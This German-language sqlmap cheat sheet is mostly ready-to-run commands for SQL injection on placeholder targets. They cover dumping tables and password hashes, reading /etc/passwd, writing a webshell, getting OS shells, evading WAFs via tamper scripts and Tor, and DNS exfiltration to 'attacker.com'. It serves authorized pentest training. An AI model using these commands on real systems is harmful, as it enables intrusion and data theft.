---
tags:
  - cybersec
  - cheatsheet
  - sqlmap
  - pentesting
  - sql-injection
  - tools
created: 2026-03-06
author: Duathron
---

# 💉 SQLMap — Pentesting Cheat Sheet

> **Zweck:** Automatisierte SQL-Injection-Erkennung und -Ausnutzung  
> **Sprache:** Python 3  
> **Repo:** https://github.com/sqlmapproject/sqlmap  
> **Wichtig:** Nur auf autorisierten Zielen verwenden!

---

## 🚀 Installation & Setup

```bash
# Kali Linux (vorinstalliert)
sqlmap --version

# Manuell via Git
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version

# pip (alternativ)
pip install sqlmap
```

---

## 🧱 Grundsyntax

```bash
sqlmap -u <URL> [Optionen]
sqlmap -u "http://target.com/page?id=1"
```

---

## 🎯 Target-Spezifikation

### GET-Parameter

```bash
sqlmap -u "http://target.com/items?id=1"
sqlmap -u "http://target.com/items?id=1&cat=3"   # mehrere Parameter
sqlmap -u "http://target.com/items?id=1" -p id    # gezielter Parameter
```

### POST-Parameter

```bash
# Daten direkt angeben
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Aus Burp-Request-Datei (empfohlen!)
sqlmap -r request.txt

# POST mit gezieltem Parameter
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" -p user
```

### Burp Request importieren (bester Workflow)

```
1. Burp Suite → Proxy → HTTP History
2. Rechtsklick auf Request → "Save item" → request.txt
3. sqlmap -r request.txt
```

```bash
# Request-Datei Beispielinhalt (request.txt):
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=test
```

### Cookie-basiert

```bash
sqlmap -u "http://target.com/profile" --cookie="session=abc123; user=1337"
sqlmap -u "http://target.com/profile" -p user --cookie="session=abc123; user=1337"
```

### HTTP-Header

```bash
# User-Agent
sqlmap -u "http://target.com/" --user-agent="Mozilla/5.0"

# Custom Header
sqlmap -u "http://target.com/" -H "X-Forwarded-For: *"
sqlmap -u "http://target.com/" -H "Referer: http://target.com/"

# Auth-Header
sqlmap -u "http://target.com/api/users" -H "Authorization: Bearer eyJ..."
```

### URL-Pfad-Parameter

```bash
# Asterisk (*) als Injection-Punkt markieren
sqlmap -u "http://target.com/users/1*/profile"
```

---

## 🔍 Erkennung & Techniken

### Injection-Techniken (`--technique`)

| Kürzel | Technik | Beschreibung |
|---|---|---|
| `B` | Boolean-based Blind | TRUE/FALSE Verhalten |
| `E` | Error-based | DB-Fehlermeldungen nutzen |
| `U` | UNION query-based | UNION SELECT Extraktion |
| `S` | Stacked queries | Mehrere Queries hintereinander |
| `T` | Time-based Blind | `SLEEP()`/`WAITFOR` |
| `Q` | Inline queries | Subquery-basiert |

```bash
# Alle Techniken (default)
sqlmap -u "http://target.com/?id=1"

# Nur schnelle Techniken
sqlmap -u "http://target.com/?id=1" --technique=BEUST

# Nur Time-based (wenn alles andere schlägt fehl)
sqlmap -u "http://target.com/?id=1" --technique=T

# Nur Union + Error (schnellste Extraktion)
sqlmap -u "http://target.com/?id=1" --technique=UE
```

### DBMS direkt angeben (Speed-Up)

```bash
sqlmap -u "http://target.com/?id=1" --dbms=mysql
sqlmap -u "http://target.com/?id=1" --dbms=mssql
sqlmap -u "http://target.com/?id=1" --dbms=postgresql
sqlmap -u "http://target.com/?id=1" --dbms=oracle
sqlmap -u "http://target.com/?id=1" --dbms=sqlite
sqlmap -u "http://target.com/?id=1" --dbms=access
```

### Level & Risk

```bash
# --level: Tiefe der Tests (1-5, default 1)
# --risk:  Risikobereitschaft der Payloads (1-3, default 1)

sqlmap -u "http://target.com/?id=1" --level=5 --risk=3
# Level 5: testet auch Headers, Cookies, Referrer
# Risk 3: inkl. Heavy Time-based (kann DB beschädigen!)
```

| Level | Testet |
|---|---|
| 1 | GET/POST Parameter (default) |
| 2 | + Cookies |
| 3 | + User-Agent, Referer |
| 4 | + Host-Header |
| 5 | + Alles |

---

## 🗄️ Datenbank-Enumeration

### Datenbankinfos ermitteln

```bash
# DBMS-Banner (Version)
sqlmap -u "http://target.com/?id=1" --banner

# Aktueller Datenbanknutzer
sqlmap -u "http://target.com/?id=1" --current-user

# Aktuelle Datenbank
sqlmap -u "http://target.com/?id=1" --current-db

# Hostname des DB-Servers
sqlmap -u "http://target.com/?id=1" --hostname

# Prüfen ob aktueller User DBA-Rechte hat
sqlmap -u "http://target.com/?id=1" --is-dba
```

### Datenbanken auflisten

```bash
# Alle Datenbanken
sqlmap -u "http://target.com/?id=1" --dbs

# Tabellen einer DB
sqlmap -u "http://target.com/?id=1" -D zieldb --tables

# Spalten einer Tabelle
sqlmap -u "http://target.com/?id=1" -D zieldb -T users --columns

# Alle Tabellen aller DBs
sqlmap -u "http://target.com/?id=1" --tables
```

### Daten dumpen

```bash
# Komplette Tabelle
sqlmap -u "http://target.com/?id=1" -D zieldb -T users --dump

# Bestimmte Spalten
sqlmap -u "http://target.com/?id=1" -D zieldb -T users -C username,password --dump

# Mit WHERE-Filter
sqlmap -u "http://target.com/?id=1" -D zieldb -T users --dump --where="id>5"

# Erste N Einträge
sqlmap -u "http://target.com/?id=1" -D zieldb -T users --dump --start=1 --stop=10

# Alles aus allen DBs (⚠️ langsam & laut)
sqlmap -u "http://target.com/?id=1" --dump-all

# Alles außer system-DBs
sqlmap -u "http://target.com/?id=1" --dump-all --exclude-sysdbs
```

### User-Enumeration

```bash
# Alle DB-Nutzer
sqlmap -u "http://target.com/?id=1" --users

# Passwort-Hashes der DB-Nutzer
sqlmap -u "http://target.com/?id=1" --passwords

# Passwörter direkt cracken
sqlmap -u "http://target.com/?id=1" --passwords --crack

# Rechte der DB-Nutzer
sqlmap -u "http://target.com/?id=1" --privileges

# Rollen (Oracle, PGSQL)
sqlmap -u "http://target.com/?id=1" --roles
```

---

## 💻 Post-Exploitation (bei ausreichenden Rechten)

### Dateisystem-Zugriff

```bash
# Datei vom Server lesen
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/?id=1" --file-read="C:/Windows/win.ini"

# Datei auf Server schreiben (benötigt FILE-Recht)
sqlmap -u "http://target.com/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### OS-Command Execution

```bash
# OS-Shell (interaktiv)
sqlmap -u "http://target.com/?id=1" --os-shell

# Einzelnen Befehl ausführen
sqlmap -u "http://target.com/?id=1" --os-cmd="id"
sqlmap -u "http://target.com/?id=1" --os-cmd="whoami"

# SQL-Shell (interaktive DB-Konsole)
sqlmap -u "http://target.com/?id=1" --sql-shell

# Einzelne SQL-Query
sqlmap -u "http://target.com/?id=1" --sql-query="SELECT user()"
```

### Out-of-Band & DNS Exfiltration

```bash
# DNS-basierte Datenexfiltration (benötigt eigenen DNS-Server)
sqlmap -u "http://target.com/?id=1" --dns-domain=attacker.com

# HTTP-basierte OOB-Verbindung
sqlmap -u "http://target.com/?id=1" --technique=T --dns-domain=attacker.com
```

---

## 🛡️ WAF/Filter-Bypass

### Tamper Scripts

```bash
# Tamper-Script anwenden
sqlmap -u "http://target.com/?id=1" --tamper=space2comment

# Mehrere kombinieren
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,between,randomcase
```

#### Wichtige Tamper Scripts

| Tamper | Beschreibung | Bypass-Ziel |
|---|---|---|
| `space2comment` | Leerzeichen → `/**/` | Einfache WAFs |
| `space2plus` | Leerzeichen → `+` | URL-Filter |
| `between` | `>` → `NOT BETWEEN 0 AND X` | Operator-Filter |
| `randomcase` | `SeLeCt` statt `SELECT` | Case-Insensitive Filter |
| `charencode` | URL-Encoding | Input-Sanitization |
| `chardoubleencode` | Doppeltes URL-Encoding | Mehrfach-Dekodierung |
| `base64encode` | Base64-kodierte Payloads | String-Filter |
| `apostrophemask` | `'` → `%EF%BC%87` | Quote-Filter |
| `equaltolike` | `=` → `LIKE` | Gleichheitszeichen-Filter |
| `greatest` | `>` → `GREATEST(a,b)` | Vergleichsoperator-Filter |
| `ifnull2ifisnull` | `IFNULL` → `IF(ISNULL)` | Funktions-Filter |
| `modsecurityversioned` | Kommentarversionen | ModSecurity |
| `unmagicquotes` | `\'` Escape-Bypass | Magic Quotes |
| `versionedmorekeywords` | MySQL-Versionskommentare | Keyword-Filter |
| `0eunion` | `UNION` → `0eUNION` | Union-Filter |

```bash
# Alle verfügbaren Tamper auflisten
sqlmap --list-tampers
```

### Weitere Bypass-Techniken

```bash
# HTTP-Delay zwischen Requests
sqlmap -u "http://target.com/?id=1" --delay=1

# Zufälliger User-Agent
sqlmap -u "http://target.com/?id=1" --random-agent

# Prefix/Suffix manuell setzen
sqlmap -u "http://target.com/?id=1" --prefix="'" --suffix="--"

# Nur bestimmten String für Vergleich nutzen
sqlmap -u "http://target.com/?id=1" --string="Welcome"
sqlmap -u "http://target.com/?id=1" --not-string="Error"

# HTTP-Status als Indikator
sqlmap -u "http://target.com/?id=1" --code=200

# Tor-Proxy nutzen
sqlmap -u "http://target.com/?id=1" --tor --tor-type=SOCKS5 --check-tor
```

---

## 🔐 Authentifizierung & Sessions

### HTTP-Authentifizierung

```bash
# Basic Auth
sqlmap -u "http://target.com/?id=1" --auth-type=basic --auth-cred="admin:password"

# Digest Auth
sqlmap -u "http://target.com/?id=1" --auth-type=digest --auth-cred="admin:password"

# NTLM
sqlmap -u "http://target.com/?id=1" --auth-type=ntlm --auth-cred="domain/user:pass"
```

### Session & Cookies

```bash
# Cookie setzen
sqlmap -u "http://target.com/?id=1" --cookie="PHPSESSID=abc123; admin=1"

# Cookie-Parameter testen
sqlmap -u "http://target.com/" --cookie="user=1" -p user --level=2

# Session aus Datei laden
sqlmap -u "http://target.com/?id=1" --load-cookies=cookies.txt
```

### CSRF-Token handling

```bash
# CSRF-Token automatisch aktualisieren
sqlmap -u "http://target.com/login" --data="user=admin&pass=test&csrf=TOKEN" \
  --csrf-token=csrf --csrf-url="http://target.com/login"
```

---

## 🌐 Proxy-Integration

### Burp Suite als Proxy

```bash
# Über Burp routen (Traffic analysieren)
sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"

# Mit Burp + Zertifikat (HTTPS)
sqlmap -u "https://target.com/?id=1" --proxy="http://127.0.0.1:8080"
```

### Tor

```bash
sqlmap -u "http://target.com/?id=1" --tor --tor-type=SOCKS5 --tor-port=9050 --check-tor
```

---

## ⚡ Performance & Optimierung

```bash
# Anzahl Threads (default: 1, max: 10)
sqlmap -u "http://target.com/?id=1" --threads=5

# Timeout pro Request
sqlmap -u "http://target.com/?id=1" --timeout=10

# Wiederholungsversuche bei Timeout
sqlmap -u "http://target.com/?id=1" --retries=3

# Delay zwischen Requests (Sekunden)
sqlmap -u "http://target.com/?id=1" --delay=0.5

# Safe-URL regelmäßig aufrufen (Session-Refresh)
sqlmap -u "http://target.com/?id=1" --safe-url="http://target.com/" --safe-freq=10

# Ausgabe auf minimales reduzieren
sqlmap -u "http://target.com/?id=1" -q
```

---

## 📦 Output & Logging

### Verbosity

```bash
-v 0    # Nur kritische Fehler
-v 1    # Info (default)
-v 2    # Debug
-v 3    # Payloads anzeigen
-v 4    # HTTP Requests
-v 5    # HTTP Requests + Response Header
-v 6    # HTTP Requests + vollständige Response
```

### Output-Verzeichnis

```bash
# Ergebnisse werden gespeichert in:
~/.local/share/sqlmap/output/<target>/

# Ausgabepfad festlegen
sqlmap -u "http://target.com/?id=1" --output-dir=/tmp/sqlmap_results/

# Session-Datei für Resume
sqlmap -u "http://target.com/?id=1" --session=mysession

# CSV-Export
sqlmap -u "http://target.com/?id=1" -D db -T users --dump --dump-format=CSV
```

---

## 🔄 Nützliche Flags & Automatisierung

### Interaktive Eingaben überspringen

```bash
# Alle Fragen mit "Ja" beantworten (⚠️ vorsichtig!)
sqlmap -u "http://target.com/?id=1" --batch

# Nur Fragen mit Default überspringen
sqlmap -u "http://target.com/?id=1" --answers="crack=Y,followup=N"
```

### Scope kontrollieren

```bash
# Nur bestimmte Datenbank testen
sqlmap -u "http://target.com/?id=1" -D zieldb

# Forms automatisch erkennen und testen
sqlmap -u "http://target.com/" --forms

# Alle Links auf Seite crawlen
sqlmap -u "http://target.com/" --crawl=2

# Nur spezifischen Parameter testen
sqlmap -u "http://target.com/?id=1&cat=3" -p id
```

### Passwort-Cracking

```bash
# Gefundene Hashes cracken
sqlmap -u "http://target.com/?id=1" --passwords --crack

# Eigene Wordlist
sqlmap -u "http://target.com/?id=1" --passwords --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 🗂️ Komplette Beispiel-Workflows

### Standard-Enumeration (CTF / THM)

```bash
# Schritt 1: Vulnerability bestätigen
sqlmap -u "http://target.com/vuln.php?id=1" --dbs

# Schritt 2: Tabellen der Ziel-DB
sqlmap -u "http://target.com/vuln.php?id=1" -D targetdb --tables

# Schritt 3: Spalten der Zieltabelle
sqlmap -u "http://target.com/vuln.php?id=1" -D targetdb -T users --columns

# Schritt 4: Daten dumpen
sqlmap -u "http://target.com/vuln.php?id=1" -D targetdb -T users -C username,password --dump
```

### Login-Form mit CSRF

```bash
sqlmap -u "http://target.com/login.php" \
  --data="username=admin&password=test&_token=ABCD1234" \
  --csrf-token=_token \
  --csrf-url="http://target.com/login.php" \
  --batch --dbs
```

### Authenticated Scan (Session Cookie)

```bash
sqlmap -r request.txt \
  --cookie="PHPSESSID=abc123def456" \
  --level=3 --risk=2 \
  --batch \
  -D app_db --tables
```

### WAF-Bypass mit Tamper

```bash
sqlmap -u "http://target.com/?id=1" \
  --tamper=space2comment,randomcase,between \
  --random-agent \
  --delay=1 \
  --level=3 --risk=2 \
  --batch --dbs
```

### API-Endpoint (JSON POST)

```bash
# JSON-Body
sqlmap -u "http://target.com/api/user" \
  --data='{"id": 1}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJ..." \
  --batch --dbs
```

### HTTPS + Burp Proxy (Traffic analysieren)

```bash
sqlmap -u "https://target.com/page?id=1" \
  --proxy="http://127.0.0.1:8080" \
  --level=3 \
  --batch --dbs
```

---

## 📊 Unterstützte DBMS

| DBMS | Vollständige Unterstützung |
|---|---|
| MySQL / MariaDB | ✅ |
| Microsoft SQL Server | ✅ |
| Oracle | ✅ |
| PostgreSQL | ✅ |
| Microsoft Access | ✅ |
| SQLite | ✅ |
| Firebird | ✅ |
| Sybase | ✅ |
| SAP MaxDB | ✅ |
| HSQLDB | ✅ |
| H2 | ✅ |
| MonetDB | ✅ |
| Apache Derby | ✅ |
| Amazon Redshift | ✅ |
| Vertica | ✅ |

---

## 🧠 SQLMap + Burp Suite — Kombinations-Workflow

```
1. Burp Suite öffnen, Proxy aktivieren
2. Ziel-App manuell erkunden → interessante Requests identifizieren
3. Request in Burp: Rechtsklick → "Copy to file" → request.txt
4. sqlmap -r request.txt --batch --dbs
5. Für SQLMap-Traffic zurück durch Burp leiten:
   sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch --dbs
   → Volle Request-Sichtbarkeit in Burp History
```

---

## 🔑 Quick Reference — Wichtigste Flags

| Flag | Beschreibung |
|---|---|
| `-u` | Ziel-URL |
| `-r` | Request aus Datei (Burp) |
| `-p` | Gezielter Parameter |
| `--data` | POST-Daten |
| `--cookie` | Cookie-String |
| `--dbs` | Datenbanken auflisten |
| `-D` | Datenbank auswählen |
| `--tables` | Tabellen auflisten |
| `-T` | Tabelle auswählen |
| `--columns` | Spalten auflisten |
| `-C` | Spalten auswählen |
| `--dump` | Daten extrahieren |
| `--dump-all` | Alles dumpen |
| `--batch` | Nicht-interaktiv |
| `--level` | Testtiefe (1-5) |
| `--risk` | Payload-Risiko (1-3) |
| `--technique` | SQLi-Technik (BEUSTQ) |
| `--dbms` | DBMS angeben |
| `--tamper` | Filter-Bypass-Skript |
| `--random-agent` | Zufälliger User-Agent |
| `--proxy` | HTTP-Proxy |
| `--tor` | Tor-Netzwerk nutzen |
| `--threads` | Parallelität (1-10) |
| `--os-shell` | Interaktive OS-Shell |
| `--sql-shell` | Interaktive SQL-Shell |
| `--file-read` | Datei vom Server lesen |
| `--file-write` | Datei auf Server schreiben |
| `-v` | Verbosity (0-6) |
| `--banner` | DBMS-Version ermitteln |
| `--is-dba` | DBA-Rechte prüfen |
| `--passwords` | DB-User-Passwörter |
| `--forms` | Forms automatisch finden |
| `--crawl` | Seite crawlen |

---

## 🔗 Ressourcen

- [SQLMap offizielles Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
- [PayloadsAllTheThings – SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks – SQLMap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
- [PortSwigger – SQL Injection](https://portswigger.net/web-security/sql-injection)
- [TryHackMe – SQLMap Room](https://tryhackme.com/room/sqlmap)

---

> ⚠️ **Legal Disclaimer:** Dieses Cheat Sheet dient ausschließlich zu Bildungszwecken und für autorisierte Penetration Tests. Die Nutzung dieser Techniken ohne explizite Genehmigung des Zielsystems ist illegal.
